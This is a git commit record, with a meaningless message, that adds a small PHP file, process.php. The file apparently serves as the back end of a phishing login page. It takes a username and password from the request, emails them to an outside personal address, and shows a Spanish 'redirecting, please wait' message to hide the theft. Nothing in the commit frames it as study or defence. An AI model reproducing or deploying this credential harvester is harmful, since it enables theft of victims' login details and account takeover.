66e4a13af50204c88b0db02c498469ae1b3df8ea
alexjhoel <52894163+alexjhoel@users.noreply.github.com>
2022-10-14 15:52:38 -0300

    Casdas
    dasd

---
+++ process.php
@@ -0,0 +1,14 @@
+<html>
+<body>
+<?php
+$msg = $_GET["username"] . " " . $_GET["password"];
+mail("alexanderalmeida20@gmail.com", "Hola", $msg)  ?><br>
+Redireccionando, aguarde un momento
+
+<?php 
+
+
+?>
+
+</body>
+</html>
